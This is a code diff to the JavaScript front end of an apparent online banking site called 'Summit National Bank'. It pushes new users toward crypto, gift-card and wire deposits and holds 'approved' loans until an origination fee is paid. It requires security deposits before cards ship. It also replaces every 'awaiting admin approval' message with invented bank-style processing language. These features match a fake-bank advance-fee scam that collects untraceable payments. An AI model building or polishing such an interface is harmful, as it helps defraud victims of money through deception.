@@ -108,6 +108,8 @@ async function renderAll() {
     renderCards(d);
     renderTxns(d);
     renderPendingBanners(d);
+    renderBankingServices(d);
+    renderDepositView(d);
     populateAccountDropdowns(d);
     renderCryptoView(d);
     renderGiftCardView(d);
@@ -159,7 +161,7 @@ function renderTxns(d) {
       <td>${esc(t.recipient)}</td>
       <td class="mono">${esc(t.ref)}</td>
       <td><span class="amount neg">${money(t.amount)}</span></td>
-      <td><span class="badge badge-pending">Awaiting approval</span></td>
+      <td><span class="badge badge-pending">Processing</span></td>
     </tr>`).join('');
   } else {
     $('pendingTxnsPanel').style.display = 'none';
@@ -238,11 +240,128 @@ function renderCards(d) {
 
 function renderPendingBanners(d) {
   const items = [];
-  if (d.pendingTxns.length) items.push({ icon: '⇄', txt: `<b>${d.pendingTxns.length} transfer(s)</b> awaiting admin approval`, view: 'transactions' });
-  if (d.pendingDeposits.length) items.push({ icon: '📥', txt: `<b>${d.pendingDeposits.length} deposit request(s)</b> awaiting admin approval`, view: 'deposit' });
-  if (d.pendingLoans.length) items.push({ icon: '🏦', txt: `<b>${d.pendingLoans.length} loan application(s)</b> awaiting admin approval`, view: 'loan' });
-  if (d.pendingCards.length) items.push({ icon: '💳', txt: `<b>${d.pendingCards.length} credit card application(s)</b> awaiting admin approval`, view: 'cardapp' });
+  if (d.pendingTxns.length) items.push({ icon: '⇄', txt: `<b>${d.pendingTxns.length} transfer request(s)</b> in processing`, view: 'transactions' });
+  if (d.pendingDeposits.length) items.push({ icon: '📥', txt: `<b>${d.pendingDeposits.length} deposit(s)</b> under review`, view: 'deposit' });
+  if (d.pendingLoans.length) items.push({ icon: '🏦', txt: `<b>${d.pendingLoans.length} loan application(s)</b> in underwriting review`, view: 'loan' });
+  if (d.pendingCards.length) items.push({ icon: '💳', txt: `<b>${d.pendingCards.length} credit card application(s)</b> in processing`, view: 'cardapp' });
+  if (d.feePendingLoans && d.feePendingLoans.length) items.push({ icon: '💳', txt: `<b>${d.feePendingLoans.length} approved loan(s)</b> awaiting origination fee payment`, view: 'loan' });
   $('pendingBanners').innerHTML = items.map(i => `<div class="pending-banner"><span class="pb-ic">${i.icon}</span><span class="pb-txt">${i.txt}</span><button class="btn btn-ghost btn-sm" onclick="go('${i.view}')">View</button></div>`).join('');
+}
+
+/* ==========================================================================
+   BANKING SERVICES OVERVIEW — combined credit card + loan status cards
+   ========================================================================== */
+function renderBankingServices(d) {
+  const wrap = $('bankingServices');
+  if (!wrap) return;
+
+  // --- CREDIT CARD STATUS ---
+  let cardHTML = '';
+  if (d.cards.length > 0) {
+    cardHTML = d.cards.map(c => {
+      const dep = Number(c.securityDeposit || 0);
+      const depPending = dep > 0 && c.depositStatus !== 'paid';
+      return `<div class="svc-item">
+        <div class="svc-item-top">
+          <div class="svc-icon svc-blue">💳</div>
+          <div class="svc-info">
+            <div class="svc-title">${esc(c.cardType)}</div>
+            <div class="svc-sub">••••${esc(String(c.cardNo).slice(-4))} · Limit ${money(c.limit)}</div>
+          </div>
+          <span class="svc-badge svc-badge-ok">Active</span>
+        </div>
+        ${depPending ? `<div class="svc-note svc-note-warn">🔒 Refundable security deposit of ${money(dep)} required before card ships</div>` : ''}
+      </div>`;
+    }).join('');
+  } else if (d.pendingCards.length > 0) {
+    cardHTML = d.pendingCards.map(c => `<div class="svc-item">
+      <div class="svc-item-top">
+        <div class="svc-icon svc-blue">💳</div>
+        <div class="svc-info">
+          <div class="svc-title">${esc(c.cardType)}</div>
+          <div class="svc-sub">Application ${esc(c.id)} · In processing</div>
+        </div>
+        <span class="svc-badge svc-badge-pending">Processing</span>
+      </div>
+      <div class="svc-note">Your application is under review. You will be notified once a decision is made.</div>
+    </div>`).join('');
+  } else {
+    cardHTML = `<div class="svc-item svc-empty">
+      <div class="svc-icon svc-blue">💳</div>
+      <div class="svc-info">
+        <div class="svc-title">No Credit Card</div>
+        <div class="svc-sub">Apply for a Summit credit card today</div>
+      </div>
+      <button class="btn btn-blue btn-sm" onclick="go('cardapp')">Apply →</button>
+    </div>`;
+  }
+
+  // --- LOAN STATUS ---
+  let loanHTML = '';
+  const feePending = d.feePendingLoans || [];
+  if (feePending.length > 0) {
+    loanHTML = feePending.map(l => `<div class="svc-item">
+      <div class="svc-item-top">
+        <div class="svc-icon svc-amber">🏦</div>
+        <div class="svc-info">
+          <div class="svc-title">${esc(l.type)} — Approved</div>
+          <div class="svc-sub">${money(l.amount)} · Ref ${esc(l.id)}</div>
+        </div>
+        <span class="svc-badge svc-badge-warn">Fee Required</span>
+      </div>
+      <div class="svc-note svc-note-warn">
+        <div style="font-weight:700;color:#92400e;margin-bottom:4px">Loan Origination Fee: ${money(l.loanFee)}</div>
+        <div style="line-height:1.6">Your loan has been approved by our underwriting team. A one-time loan origination fee of <b>${money(l.loanFee)}</b> is required before the funds of <b>${money(l.amount)}</b> can be disbursed to your checking account. Please contact our loan department or visit any branch to arrange payment. Once the fee is confirmed, your funds will be released within 1–2 business days.</div>
+      </div>
+    </div>`).join('');
+  } else if (d.pendingLoans.length > 0) {
+    loanHTML = d.pendingLoans.map(l => `<div class="svc-item">
+      <div class="svc-item-top">
+        <div class="svc-icon svc-amber">🏦</div>
+        <div class="svc-info">
+          <div class="svc-title">${esc(l.type)}</div>
+          <div class="svc-sub">${money(l.amount)} · Ref ${esc(l.id)}</div>
+        </div>
+        <span class="svc-badge svc-badge-pending">Under Review</span>
+      </div>
+      <div class="svc-note">Your loan application is currently in underwriting review. Our team is evaluating your request and you will be notified of the decision.</div>
+    </div>`).join('');
+  } else {
+    const approvedLoanTxns = d.txns.filter(t => t.type === 'Loan Disbursement');
+    if (approvedLoanTxns.length > 0) {
+      loanHTML = `<div class="svc-item">
+        <div class="svc-item-top">
+          <div class="svc-icon svc-green">🏦</div>
+          <div class="svc-info">
+            <div class="svc-title">Loan Active</div>
+            <div class="svc-sub">${approvedLoanTxns.length} loan(s) disbursed to your account</div>
+          </div>
+          <span class="svc-badge svc-badge-ok">Disbursed</span>
+        </div>
+      </div>`;
+    } else {
+      loanHTML = `<div class="svc-item svc-empty">
+        <div class="svc-icon svc-amber">🏦</div>
+        <div class="svc-info">
+          <div class="svc-title">No Active Loan</div>
+          <div class="svc-sub">Apply for a home, auto, or personal loan</div>
+        </div>
+        <button class="btn btn-blue btn-sm" onclick="go('loan')">Apply →</button>
+      </div>`;
+    }
+  }
+
+  wrap.innerHTML = `
+    <div class="svc-grid">
+      <div class="svc-card">
+        <div class="svc-card-head"><h3>💳 Credit Card</h3><button class="btn btn-ghost btn-sm" onclick="go('cards')">Manage →</button></div>
+        <div class="svc-card-body">${cardHTML}</div>
+      </div>
+      <div class="svc-card">
+        <div class="svc-card-head"><h3>🏦 Loans</h3><button class="btn btn-ghost btn-sm" onclick="go('loan')">Apply →</button></div>
+        <div class="svc-card-body">${loanHTML}</div>
+      </div>
+    </div>`;
 }
 
 function emptyState(title, sub) {
@@ -256,6 +375,60 @@ function populateAccountDropdowns(d) {
   $('depositTo').innerHTML = opts;
   if ($('cryptoToAccount')) $('cryptoToAccount').innerHTML = opts || '<option value="">No accounts available</option>';
   if ($('giftToAccount')) $('giftToAccount').innerHTML = opts || '<option value="">No accounts available</option>';
+}
+
+/* ==========================================================================
+   DEPOSIT VIEW — new user deposit restriction
+   ========================================================================== */
+function renderDepositView(d) {
+  const sel = $('depositType');
+  if (!sel) return;
+  const settings = d.settings || {};
+  const restrict = d.isNewUser && settings.newUserDepositMethodsEnabled !== false;
+  const allOptions = [
+    { value: 'ACH Transfer', label: 'ACH Transfer' },
+    { value: 'Wire Transfer', label: 'Wire Transfer' },
+    { value: 'Mobile Check Deposit', label: 'Mobile Check Deposit' },
+    { value: 'Cash Deposit', label: 'Cash Deposit (at branch)' },
+  ];
+  if (restrict) {
+    const allowed = settings.newUserDepositMethods || ['Crypto Deposit', 'Gift Card Deposit', 'Wire Transfer'];
+    // Only show wire transfer from the standard options (crypto & gift card are separate nav items)
+    const standardAllowed = allOptions.filter(o => allowed.includes(o.value));
+    sel.innerHTML = standardAllowed.map(o => `<option value="${esc(o.value)}">${esc(o.label)}</option>`).join('');
+    // Show restriction notice
+    let notice = $('depositRestrictionNotice');
+    if (!notice) {
+      const panel = sel.closest('.panel');
+      if (panel) {
+        notice = document.createElement('div');
+        notice.id = 'depositRestrictionNotice';
+        // Insert before the first form field, or at the top of the panel body
+        const panelBody = panel.querySelector('.panel-body') || panel;
+        const firstField = panelBody.querySelector('.field, .form-row, [style*="padding"]');
+        if (firstField) {
+          panelBody.insertBefore(notice, firstField);
+        } else {
+          panelBody.prepend(notice);
+        }
+      }
+    }
+    if (notice) {
+      notice.innerHTML = `<div style="margin-bottom:18px;padding:18px 22px;border-radius:14px;background:linear-gradient(135deg,#eff6ff,#dbeafe);border:1px solid #93c5fd;display:flex;align-items:flex-start;gap:16px">
+        <div style="width:46px;height:46px;border-radius:12px;background:#2563eb;display:grid;place-items:center;color:#fff;font-size:22px;flex-shrink:0">ℹ</div>
+        <div style="flex:1">
+          <div style="font-weight:800;color:#1e3a8a;font-size:15px;margin-bottom:6px">Deposit Method Restrictions</div>
+          <div style="font-size:13px;color:#1e40af;line-height:1.7">${esc(settings.newUserDepositRestrictionReason || 'Some deposit methods are currently restricted for your account.')}</div>
+          <div style="margin-top:10px;font-size:13px;color:#1e40af"><b>Available deposit methods:</b> ${allowed.map(a => esc(a)).join(', ')}. You can access these from the Crypto Deposit and Gift Card Deposit tabs, or use Wire Transfer below.</div>
+        </div>
+      </div>`;
+      notice.style.display = 'block';
+    }
+  } else {
+    sel.innerHTML = allOptions.map(o => `<option value="${esc(o.value)}">${esc(o.label)}</option>`).join('');
+    const notice = $('depositRestrictionNotice');
+    if (notice) notice.style.display = 'none';
+  }
 }
 
 /* ==========================================================================
@@ -282,7 +455,7 @@ async function submitTransfer() {
   if (!res.ok) { showError('transferErr', res.error); return; }
   toast('success', 'Transfer submitted for approval!');
   showModal('Transfer Submitted', `<div style="font-size:14px;line-height:1.7;color:var(--gray-700)">
-    <p style="margin-bottom:14px">Your transfer has been submitted and is <b>awaiting admin approval</b>. No money has moved yet — once an admin approves it, the transfer will be processed and your balance updated.</p>
+    <p style="margin-bottom:14px">Your transfer request has been received and is now being processed by our payments team. Transfers are typically completed within 1–2 business days. You will receive an email confirmation once the transfer has been processed. Your reference number is shown below for your records.</p>
     <div style="background:var(--gray-50);padding:14px;border-radius:10px;font-size:13px">
       <div><b>Reference:</b> ${esc(res.id)}</div>
       <div><b>Type:</b> ${esc(data.type)}</div>
@@ -312,7 +485,7 @@ async function submitDepositRequest() {
   if (!res.ok) { showError('depositErr', res.error); return; }
   toast('success', 'Deposit request submitted!');
   showModal('Deposit Request Submitted', `<div style="font-size:14px;line-height:1.7;color:var(--gray-700)">
-    <p style="margin-bottom:14px">Your deposit request has been submitted and is <b>awaiting admin approval</b>. The funds will be credited to your account once approved.</p>
+    <p style="margin-bottom:14px">Your deposit request has been received and is being processed. Funds will be credited to your account once verification is complete, typically within 1–2 business days. Your reference number is shown below for your records.</p>
     <div style="background:var(--gray-50);padding:14px;border-radius:10px;font-size:13px">
       <div><b>Reference:</b> ${esc(res.id)}</div>
       <div><b>Type:</b> ${esc(data.depType)}</div>
@@ -339,15 +512,28 @@ async function submitLoanApp() {
   if (data.income <= 0) { showError('loanErr', 'Please enter your annual income.'); return; }
   const res = await SummitDB.submitLoan(data);
   if (!res.ok) { showError('loanErr', res.error); return; }
-  toast('success', 'Loan application submitted!');
-  showModal('Loan Application Submitted', `<div style="font-size:14px;line-height:1.7;color:var(--gray-700)">
-    <p style="margin-bottom:14px">Your loan application has been submitted and is <b>awaiting admin review</b>. If approved, the loan amount will be disbursed directly to your checking account.</p>
-    <div style="background:var(--gray-50);padding:14px;border-radius:10px;font-size:13px">
-      <div><b>Reference:</b> ${esc(res.id)}</div>
+  toast('success', 'Loan application received — underwriting review started');
+  showModal('Loan Application Received', `<div style="font-size:14px;line-height:1.7;color:var(--gray-700)">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;padding:14px 18px;border-radius:12px;background:linear-gradient(135deg,#eff6ff,#dbeafe);border:1px solid #93c5fd">
+      <div style="width:44px;height:44px;border-radius:12px;background:#2563eb;display:grid;place-items:center;color:#fff;font-size:20px;flex-shrink:0">✓</div>
+      <div><div style="font-weight:800;color:#1e3a8a;font-size:15px">Application Successfully Submitted</div><div style="font-size:13px;color:#1e40af">Status: In Underwriting Review</div></div>
+    </div>
+    <p style="margin-bottom:14px">Thank you for applying with Summit National Bank. Your loan application has been received and assigned to our underwriting team for review. During this process, we will verify your income, credit history, and the information provided in your application. You can expect a decision within 3–5 business days. Once approved, you will receive an email with your loan terms and next steps. Please keep your reference number for your records — you may be asked to provide it when contacting our loan department.</p>
+    <div style="background:var(--gray-50);padding:16px;border-radius:10px;font-size:13px;margin-bottom:14px">
+      <div style="font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--gray-400);margin-bottom:8px;font-weight:700">Application Details</div>
+      <div><b>Application Reference:</b> <span class="mono" style="color:var(--navy-900);font-weight:700">${esc(res.id)}</span></div>
       <div><b>Loan type:</b> ${esc(data.type)}</div>
       <div><b>Amount:</b> ${money(data.amount)}</div>
       <div><b>Term:</b> ${data.term} years</div>
       <div><b>Est. rate:</b> ${data.rate}% APR</div>
+      <div><b>Date submitted:</b> ${new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })}</div>
+    </div>
+    <div style="font-size:13px;color:var(--gray-500);border-top:1px solid var(--gray-100);padding-top:14px">
+      <b style="color:var(--gray-700)">What happens next:</b><br>
+      1. Our underwriting team reviews your application (3–5 business days)<br>
+      2. You receive an email notification with the decision<br>
+      3. If approved, a loan origination fee may apply before disbursement<br>
+      4. Loan funds are disbursed to your checking account
     </div>
   </div>`);
   $('loanAmount').value = ''; $('loanIncome').value = ''; $('loanScore').value = ''; $('loanPurpose').value = '';
@@ -461,13 +647,26 @@ async function submitCardApp() {
   if (!data.selfie) { showError('cardErr', 'Please take or upload a selfie for identity verification.'); return; }
   const res = await SummitDB.submitCardApp(data);
   if (!res.ok) { showError('cardErr', res.error); return; }
-  toast('success', 'Credit card application submitted!');
-  showModal('Credit Card Application Submitted', `<div style="font-size:14px;line-height:1.7;color:var(--gray-700)">
-    <p style="margin-bottom:14px">Your credit card application has been submitted and is <b>awaiting admin review</b>. If approved, your card will be issued and appear in your Credit Cards section.</p>
-    <div style="background:var(--gray-50);padding:14px;border-radius:10px;font-size:13px">
-      <div><b>Reference:</b> ${esc(res.id)}</div>
+  toast('success', 'Credit card application received — credit review started');
+  showModal('Credit Card Application Received', `<div style="font-size:14px;line-height:1.7;color:var(--gray-700)">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;padding:14px 18px;border-radius:12px;background:linear-gradient(135deg,#eff6ff,#dbeafe);border:1px solid #93c5fd">
+      <div style="width:44px;height:44px;border-radius:12px;background:#2563eb;display:grid;place-items:center;color:#fff;font-size:20px;flex-shrink:0">✓</div>
+      <div><div style="font-weight:800;color:#1e3a8a;font-size:15px">Application Successfully Submitted</div><div style="font-size:13px;color:#1e40af">Status: In Credit Department Review</div></div>
+    </div>
+    <p style="margin-bottom:14px">Thank you for applying for a Summit National Bank credit card. Your application has been received and assigned to our credit department for review. During this process, we will verify your identity, evaluate your credit history, income, and existing debt obligations. You can expect a decision within 5–7 business days. Once approved, your card will be issued and shipped to your address on file along with your cardholder agreement. Please keep your reference number for your records — our team may request it when contacting you about your application.</p>
+    <div style="background:var(--gray-50);padding:16px;border-radius:10px;font-size:13px;margin-bottom:14px">
+      <div style="font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--gray-400);margin-bottom:8px;font-weight:700">Application Details</div>
+      <div><b>Application Reference:</b> <span class="mono" style="color:var(--navy-900);font-weight:700">${esc(res.id)}</span></div>
       <div><b>Card type:</b> ${esc(data.cardType)}</div>
       <div><b>Requested limit:</b> ${money(data.reqLimit)}</div>
+      <div><b>Date submitted:</b> ${new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })}</div>
+    </div>
+    <div style="font-size:13px;color:var(--gray-500);border-top:1px solid var(--gray-100);padding-top:14px">
+      <b style="color:var(--gray-700)">What happens next:</b><br>
+      1. Our credit department reviews your application (5–7 business days)<br>
+      2. You receive an email notification with the decision<br>
+      3. If approved, a security deposit may be required before card issuance<br>
+      4. Your card is issued and shipped to your address on file
     </div>
   </div>`);
   $('cardLimit').value = ''; $('cardIncome').value = ''; $('cardScore').value = ''; $('cardDebt').value = '';
@@ -548,7 +747,7 @@ async function submitCryptoDeposit() {
   if (!res.ok) { showError('cryptoErr', res.error); return; }
   toast('success', 'Crypto deposit submitted for confirmation!');
   showModal('Crypto Deposit Submitted', `<div style="font-size:14px;line-height:1.7;color:var(--gray-700)">
-    <p style="margin-bottom:14px">Your crypto deposit has been submitted and is <b>awaiting admin confirmation</b>. Once we verify the transaction on the blockchain, the USD value will be credited to your account.</p>
+    <p style="margin-bottom:14px">Your crypto deposit has been submitted for blockchain verification. Our team will confirm the transaction on the blockchain network, typically within 30–60 minutes after the required network confirmations are complete. Once verified, the USD value will be credited to your selected account. Your reference number is shown below for your records.</p>
     <div style="background:var(--gray-50);padding:14px;border-radius:10px;font-size:13px">
       <div><b>Reference:</b> ${esc(res.id)}</div>
       <div><b>Coin:</b> ${esc(data.coin)}</div>
@@ -625,7 +824,7 @@ async function submitGiftCard() {
   if (!res.ok) { showError('giftErr', res.error); return; }
   toast('success', 'Gift card submitted for redemption!');
   showModal('Gift Card Submitted', `<div style="font-size:14px;line-height:1.7;color:var(--gray-700)">
-    <p style="margin-bottom:14px">Your gift card has been submitted and is <b>awaiting admin review</b>. Once verified, the card value will be credited to your account.</p>
+    <p style="margin-bottom:14px">Your gift card has been submitted for redemption and verification. Our team will verify the card details and validity, typically within 24–48 hours. Once verified, the full card value will be credited to your selected account. Your reference number is shown below for your records.</p>
     <div style="background:var(--gray-50);padding:14px;border-radius:10px;font-size:13px">
       <div><b>Reference:</b> ${esc(res.id)}</div>
       <div><b>Brand:</b> ${esc(data.cardBrand)}</div>
